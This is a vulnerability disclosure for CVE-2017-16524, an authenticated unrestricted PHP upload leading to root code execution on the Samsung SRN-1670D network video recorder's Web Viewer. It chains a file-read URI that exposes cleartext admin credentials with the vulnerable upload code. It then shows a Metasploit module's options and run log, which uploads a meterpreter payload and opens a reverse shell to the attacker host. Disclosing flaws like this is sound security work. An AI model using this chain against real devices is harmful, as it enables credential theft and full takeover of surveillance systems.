# CVE-2017-16524

### Discovered by
Omar Mezrag - 0xFFFFFF

### Affected Product
Samsung Network Video Recorders - Web Viewer 1.0.0.193 on Samsung SRN-1670D

### Vendor of Product
Hanwha / Samsung Security - https://www.hanwhasecurity.com/

### Vulnerability type
Unrestricted file upload vulnerability

### Attack Vector
```markdown
AccessVector (AV): Network
User Interaction (UI): None
Authentication (Au): Requires single instance
```

### Impact
```markdown
Code execution (ROOT)
```

### Affected Component
```markdown
network_ssl_upload.php (tested)
network_802_1x1.php (suspected)
network_802_1x2.php (suspected)
```


### Desciption
Web Viewer 1.0.0.193 on Samsung SRN-1670D device suffers from an
Unrestricted file upload vulnerability: 'network_ssl_upload.php'
allows remote authenticated attackers to upload and execute arbitrary
PHP code via a filename with a .php extension, which is then accessed via a
direct request to the file in the upload/ directory. 
To authenticate for this attack, one can obtain web-interface credentials 
in cleartext by leveraging the existing Local File Read Vulnerability 
referenced as CVE-2015-8279, which allows remote attackers to read the 
web interface credentials via a request for the URI:
```markdown
cslog_export.php?path=/root/php_modules/lighttpd/sbin/userpw 
```


### Vulnerable source code (network_ssl_upload.php) :
```markdown
    22 $path = "./upload/";
    23 $file = $_FILES[ "attachFile" ];
    24 $isApply = ( int )$_POST[ "is_apply" ];
    25 $isInstall = ( int )$_POST[ "isInstall" ];
    26 $isCertFlag = ( int )$_POST[ "isCertFlag" ];
    27 
    28 // create socket
    29 $N_message = "";
    30 $sock = mySocket_create($_is_unix_socket);
    31 $connected = mySocket_connect($_is_unix_socket, $sock);
    32 
    33 $loginInfo = new loginInfo();
    34 $retLogin = loginManager( $connected, $sock, null, $loginInfo );
    35 if ( ( $retLogin == true ) && ( $isApply == 2 || $isApply == 3 ) ) {
    36  if ($connected) {
    37   $id = $loginInfo->get_id();
    38   $xmlFile = $id.'_config.xml';
    39   $N_message = "dummy".nvr_command::DELIM;
    40   $N_message .= "userid ".$id.nvr_command::DELIM;
    41   
    42   if ( $isInstall == 1 ) {
    43    // File upload ===============================================================  
    44    if ( $file[ "error" ] 0 ) {
    45     $Error = "Error: ".$file[ "error" ];
    46    } else {
    47     $retFile = @copy( $file[ "tmp_name" ], $path.$file[ "name" ] );
    48    }
    49    // ===========================================================================
    50   }
```

### PoC
Metasploit module: [samsung_srv_1670d_upload_exec](https://github.com/realistic-security/CVE-2017-16524/blob/master/samsung_srv_1670d_upload_exec.rb)
```markdown
msf exploit(samsung_srv_1670d_upload_exec) > show options 

Module options (exploit/multi/http/samsung_srv_1670d_upload_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST    192.168.1.200      yes       The target address.
   RPORT    80               yes       The target port (TCP).
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.122      yes       The listen address
   LPORT  4358             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samsung SRN-1670D == 1.0.0.193


msf exploit(samsung_srv_1670d_upload_exec) > exploit -j 
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.1.122:4358 
msf exploit(samsung_srv_1670d_upload_exec) > [*] Obtaining credentails...
[+] Credentials obtained successfully: admin:pass123!
[*] Logging...
[+] Authentication Succeeded
[*] Generating payload[ eRdGKfFJ.php ]...
[*] Uploading payload...
[*] Executing payload...
[*] Sending stage (33986 bytes) to 192.168.1.200
[*] Meterpreter session 3 opened (192.168.1.122:4358 -> 192.168.1.200:55676) at 2017-06-19 11:52:22 +0100
```

### Additional Information
Possibly other scripts like 'network_802_1x1.php' and 'network_802_1x2.php' are affected 
by the same vulnerability but I didn't test them.

### References 
CVE-2015-8279: http://blog.emaze.net/2016/01/multiple-vulnerabilities-samsung-srn.html
